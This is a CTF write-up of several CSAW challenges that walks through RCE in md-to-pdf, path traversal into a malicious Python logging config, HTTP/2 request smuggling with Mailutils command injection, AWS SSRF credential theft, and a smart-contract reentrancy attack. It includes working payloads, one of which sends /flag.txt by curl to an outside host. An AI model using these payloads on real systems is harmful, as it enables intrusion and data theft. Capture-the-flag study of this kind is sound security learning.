</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">21</span><span>        next_word</span><span class="token" style="color:#d4d4d4">=</span><span>response1</span><span class="token" style="color:#d4d4d4">.</span><span>text</span><span class="token" style="color:#d4d4d4">[</span><span class="token" style="color:#b5cea8">7</span><span class="token" style="color:#d4d4d4">+</span><span>startingIndex</span><span class="token" style="color:#d4d4d4">:</span><span>endText</span><span class="token" style="color:#d4d4d4">+</span><span>startingIndex</span><span class="token" style="color:#d4d4d4">]</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">22</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608173/csaw/world-wide-web-flag_dtwoou.png" alt="world-wide-web-flag" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">world-wide-web-flag</p></div></div></p>
<h2 class="chakra-heading css-1uc67dn" id="my little website">My Little website</h2>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608180/csaw/my-little-website_yp34fj.png" alt="my little website" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">my little website</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/my-little-website-challenge-pic_xuyuqc.png" alt="my little website" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">my little website</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">So as far my enumeration went that&#x27;s what I found:</p>
<ul>
<li><span class="chakra-text css-gv9qss">expressJS</span> server running, identified with the headers.</li>
<li>Opens a headless chrome instance to render the pdf.</li>
<li>Dynamic XSS didn&#x27;t work, might be beacuse the bot doesn&#x27;t wait for the JS execution and even forcing it to wait doesn&#x27;t really work it renders the HTML,CSS and then the PDF.</li>
</ul>
<p class="chakra-text css-0" node="[object Object]">A wild guess by my teammate <span class="chakra-text css-gv9qss">M0ngi</span> about the markdown parser, the CVE was <em>CVE-2021-23639</em> which occurs in the vulnerable version of <em>md-to-pdf</em>.</p>
<p class="chakra-text css-0" node="[object Object]">So we execute our final payload.</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-md" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span>---js
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span></span><span class="token title" style="color:#569cd6">((require(&quot;child_process&quot;)).execSync(&quot;curl https://en7nqjdbzyckx.x.pipedream.net/ -d \&quot;$(cat /flag.txt)\&quot; &quot;))
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span class="token title" style="color:#569cd6"></span><span class="token title" style="color:#d4d4d4">---</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/my-little-website-flag_sqrb1m.png" alt="my little website" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">my little website</p></div></div></p>
<h2 class="chakra-heading css-1uc67dn" id="good intentions">Good Intentions</h2>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608207/csaw/good-intentions_q5rbw9.png" alt="Good intentions" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Good intentions</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">Reading through the code, I found that the upload is secure.
<div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608180/csaw/secure-upload_cs0nrd.png" alt="Secure upload" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Secure upload</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">But going further down the code the function to set the <span class="chakra-text css-gv9qss">logger</span> configuration file is vulnerable to <span class="chakra-text css-gv9qss">path traversal</span>.</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608175/csaw/unsecure_logconf_gan7js.png" alt="Unsecure Log set" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Unsecure Log set</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">Here, I didn&#x27;t know which evil configuration should I <span class="chakra-text css-gv9qss">upload</span> then set the logger to. I needed to have RCE on the server. Fortunately enough, my teammate <span class="chakra-text css-gv9qss">n0s</span> sent me this link  of an <style data-emotion="css 9olwc6">.css-9olwc6{transition-property:var(--chakra-transition-property-common);transition-duration:var(--chakra-transition-duration-fast);transition-timing-function:var(--chakra-transition-easing-ease-out);cursor:pointer;-webkit-text-decoration:none;text-decoration:none;outline:2px solid transparent;outline-offset:2px;color:var(--chakra-colors-orange-400);font-weight:700;}.css-9olwc6:hover,.css-9olwc6[data-hover]{-webkit-text-decoration:underline;text-decoration:underline;}.css-9olwc6:focus,.css-9olwc6[data-focus]{box-shadow:var(--chakra-shadows-outline);}</style><a class="chakra-link css-9olwc6" href="https%3A%2F%2Fgithub.com%2Fraj3shp%2Fpython-logging.config-exploit%2Fblob%2Fmain%2Fexploit%2Fbad-logger.conf%3Ffbclid%3DIwAR0W2Cdm3GLHqtFbAQjU3iatoSSTnlbj-kuUP_FYX3jYVHTvDvH7LrneBW4&amp;h=AT2QW5JZ9Xo6Qxu0-PtnFRXvizekY-KwhalZdV6aiTe0nGrJKkLDiGvLKFysZp_1QIS5xBW03o98eLDuK-LJYfHx4uSZwRB05MOYG7pu420p1iUPViifuWgRXOQHSLMjihPiJQ">Evil logger</a>.</p>
<p class="chakra-text css-0" node="[object Object]">So the final chain will be as the following:</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608204/csaw/good-intentions-request-chain_wf7er2.png" alt="good-intentions-request-chain" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">good-intentions-request-chain</p></div></div></p>
<style data-emotion="css xm64py">.css-xm64py{font-family:Sen;font-weight:var(--chakra-fontWeights-bold);font-size:40px;line-height:1.33;color:#6d6875;margin-top:var(--chakra-space-10);margin-bottom:var(--chakra-space-6);}@media screen and (min-width: 48em){.css-xm64py{line-height:1.2;}}</style><h3 class="chakra-heading css-xm64py" id="logger code ">Logger code <span class="chakra-text css-gv9qss">payload.conf</span></h3>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-yaml" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#d4d4d4">[</span><span>loggers</span><span class="token" style="color:#d4d4d4">]</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>keys=root</span><span class="token" style="color:#d4d4d4">,</span><span>simpleExample
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span></span><span class="token" style="color:#d4d4d4">[</span><span>handlers</span><span class="token" style="color:#d4d4d4">]</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span>keys=consoleHandler
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span></span><span class="token" style="color:#d4d4d4">[</span><span>formatters</span><span class="token" style="color:#d4d4d4">]</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span>keys=simpleFormatter
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span></span><span class="token" style="color:#d4d4d4">[</span><span>logger_root</span><span class="token" style="color:#d4d4d4">]</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span>level=DEBUG
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span>handlers=consoleHandler
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span><span></span><span class="token" style="color:#d4d4d4">[</span><span>logger_simpleExample</span><span class="token" style="color:#d4d4d4">]</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span>level=DEBUG
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span>handlers=consoleHandler
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">17</span>qualname=simpleExample
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">18</span>propagate=0
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">19</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">20</span><span></span><span class="token" style="color:#d4d4d4">[</span><span>handler_consoleHandler</span><span class="token" style="color:#d4d4d4">]</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">21</span><span>class=__import__(&#x27;os&#x27;).system(&#x27;cat /flag.txt </span><span class="token" style="color:#d4d4d4">&gt;</span><span> /app/application/static/images/de5fb214024af96b9f49ace64886c5/payload_ca36a4c20fafe498f263&#x27;)
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">22</span>level=DEBUG
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">23</span>formatter=simpleFormatter
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">24</span><span>args=(sys.stdout</span><span class="token" style="color:#d4d4d4">,</span><span>)
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">25</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">26</span><span></span><span class="token" style="color:#d4d4d4">[</span><span>formatter_simpleFormatter</span><span class="token" style="color:#d4d4d4">]</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">27</span><span>format=%(asctime)s </span><span class="token" style="color:#d4d4d4">-</span><span> %(name)s </span><span class="token" style="color:#d4d4d4">-</span><span> %(levelname)s </span><span class="token" style="color:#d4d4d4">-</span><span> %(message)s
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">28</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">I fired up my postman to execute that and here comes the flag !
<div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608207/csaw/Flag_zjj7z6.png" alt="Flag" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Flag</p></div></div></p>
<h2 class="chakra-heading css-1uc67dn" id="smuggling mail">Smuggling Mail</h2>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/smuggling-mail_kotgch.png" alt="Smuggling mail" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Smuggling mail</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">Going through the code, these are my findings:</p>
<ul>
<li>We got a <span class="chakra-text css-gv9qss">varnich</span> cache server.</li>
</ul>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608173/csaw/smuggling-mail-varnish-config_vlwtw8.png" alt="Smuggling-mail-varnish-conf" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Smuggling-mail-varnish-conf</p></div></div></p>
<ul>
<li>A <span class="chakra-text css-gv9qss">hitch</span> TLS proxy accepting HTTP/2 requests.
<div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608177/csaw/smuggling-mail-hitch-conf_t1dsbh.png" alt="smuggling-mail-hitch-conf" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">smuggling-mail-hitch-conf</p></div></div></li>
</ul>
<p class="chakra-text css-0" node="[object Object]">A quick research on the <span class="chakra-text css-gv9qss">varnish</span> cache server and I found the <span class="chakra-text css-gv9qss">CVE-2021-36740</span>. Actually, the cache server which works as the &quot;frontend&quot; here passes the HTTP/2 to the backend which downgrades the request to HTTP/1 which will be handled as two requests. Yes, that&#x27;s a H2.CL vulnerability also there is a cve that made me try to HTTP Smuggling exploit.</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608178/csaw/smuggling-mail-cve_s6xc02.png" alt="smuggling-mail cve" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">smuggling-mail cve</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">That&#x27;s perfectly our case, we want to bypass the authentication condition in the <span class="chakra-text css-gv9qss">varnish</span> config.
<div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608176/csaw/smuggling-mail-to-bypass_mlxaam.png" alt="smuggling-mail to bypass" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">smuggling-mail to bypass</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">We can use the <span class="chakra-text css-gv9qss">/waitlist</span> endpoint for the original request but what do we want to do here ?
<div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608176/csaw/smuggling-mail-rce-code_lze7hw.png" alt="smuggling-mail RCE code" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">smuggling-mail RCE code</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">So we want to reach the <span class="chakra-text css-gv9qss">/admin/alert</span> to trigger an RCE but how can we do it ? Some research and with the help of my teammate &#x27;m0ngi&#x27; We found the last missing piece <a class="chakra-link css-9olwc6" href="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/smuggling-mail-mail-cve_vwprts.png">Mailutils cve</a></p>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">We can <span class="chakra-text css-gv9qss">~ OUR_COMMAND</span></p>
</blockquote>
<h3 class="chakra-heading css-xm64py" id="putting it all together">Putting it all together</h3>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608176/csaw/smuggling-mail-trigger-request_zcuwoo.png" alt="smuggling mail request" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">smuggling mail request</p></div></div>
<div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/smuggling-mail-rev-shell_nubljz.png" alt="Smuggling mail rce " style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Smuggling mail rce </p></div></div></p>
<h2 class="chakra-heading css-1uc67dn" id="lost in amazon">Lost in Amazon</h2>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608198/csaw/losti-in-amazon_topqca.png" alt="Lost in amazon" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Lost in amazon</p></div></div></p>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">This challenge was a little bit too blind. What caused confusion is the directory busting part. It&#x27;s not a natural thing to come to your mind while solving a CTF task.</p>
</blockquote>
<p class="chakra-text css-0" node="[object Object]">I was really confused and couldn&#x27;t find a thing till I got a discord notification.</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608187/csaw/lost-in-amazon-discord_vbgepl.png" alt="Lost in Amazon Discord" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Lost in Amazon Discord</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">Well, a quick directory busting with <span class="chakra-text css-gv9qss">wfuzz</span>, I found two endpoints.
<div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608184/csaw/lost-in-amazon-wfuzz-1_qjhpzv.png" alt="Lost in amazon Wfuzz output 1 " style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Lost in amazon Wfuzz output 1 </p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">I curled both paths, <span class="chakra-text css-gv9qss">/secret</span> gave me a JWT and <span class="chakra-text css-gv9qss">rockyou</span> a page that has nothing in it.
<div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608198/csaw/lost-in-amazon-token-lost_rninuu.png" alt="Lost in amazzon Confusion" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Lost in amazzon Confusion</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">An intuitive move is to set the jwt token and revisit <span class="chakra-text css-gv9qss">/rockyou</span> right ? It gave me nothing. I tried to set <span class="chakra-text css-gv9qss">secret</span> cookie as the JWT too but nothing ...  also we should note that jwt itself has nothing interesting. I felt really like I hit a dead end.
<div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608185/csaw/lost-in-amazon-jwt-check_igswk3.png" alt="picture 18" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">picture 18</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">At last, I reached for the admin, I knew that there was something unintuitive to do <span class="chakra-text css-gv9qss">also noting the cries of agony in the discord channel because of the task</span>
<div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608184/csaw/lost-in-amazon-hint_c7cdii.png" alt="Lost in amazon HINT" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Lost in amazon HINT</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">Oh I see I had to fuzz one path deeper and found <span class="chakra-text css-gv9qss">/developer/heaven</span>
<div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608205/csaw/lost-in-amazon-dirb_bjnbne.png" alt="Lost in amazon dirbusting depths 2" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Lost in amazon dirbusting depths 2</p></div></div><br/>
<div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608219/csaw/lost-in-amazon-findings2_sfiezz.png" alt="Lost in amazon /developer/heaven" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Lost in amazon /developer/heaven</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">Now I have an idea why do I need the JWT token. I added a cookie with the name of <span class="chakra-text css-gv9qss">secret</span>.
<div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608215/csaw/lost-in-amazon-access_zf2ld5.png" alt="Lost in amazon access /developer/heaven" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Lost in amazon access /developer/heaven</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">It was really easy now. Going back to the name of the Task and especially the <span class="chakra-text css-gv9qss">amazon</span> part. I knew it was an amazon SSRF vulnerability.
I didn&#x27;t waste any time.</p>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">I tried tempering with the _magiccall paramater but it gave nothing so I passed.</p>
</blockquote>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608194/csaw/lost-in-amazon-creds_df6cet.png" alt="Lost in amazon aws creds" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Lost in amazon aws creds</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">I added the profile to my <span class="chakra-text css-gv9qss">aws-cli</span>.
<div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608193/csaw/lost-in-amazon-aws-config_nzybus.png" alt="Lost in amazon aws configure" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Lost in amazon aws configure</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">Then I tried to look for any <span class="chakra-text css-gv9qss">s3 buckets</span>
<div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608184/csaw/lost-in-amazon-s3_ie3fcj.png" alt="Lost in amazon s3 error" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Lost in amazon s3 error</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">My teammate <span class="chakra-text css-gv9qss">N0s</span> pinged me here and told me to try to specify the bucket region as buckets can be region-specific. So I looked for it
<div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608186/csaw/lost-in-amazon-region_tcoilm.png" alt="Lost in amazon finding region" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Lost in amazon finding region</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">and finally I got the flag.
<div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608189/csaw/lost-in-amazon-flag-aws_qr4uzq.png" alt="Lost in amazon flag" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Lost in amazon flag</p></div></div></p>
<h2 class="chakra-heading css-1uc67dn" id="donateme">DonateMe</h2>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608208/csaw/donate-more_efrhig.png" alt="Donate more" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Donate more</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">A basic <span class="chakra-text css-gv9qss">reentrancy vulnerability</span>. I crafted an evil contract to exploit it.</p>
<ol>
<li>Send 0.0001 ether to trigger the reentrancy loop.</li>
<li>Stop the loop after the balance gets to 30.</li>
<li>Send the token via <span class="chakra-text css-gv9qss">getFlag</span>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">You can use ethers.utils.formatBytes32String(TOKEN) to get the right format to pass.</p>
</blockquote>
</li>
<li><span class="chakra-text css-gv9qss">yes</span> and get the flag.</li>
</ol>
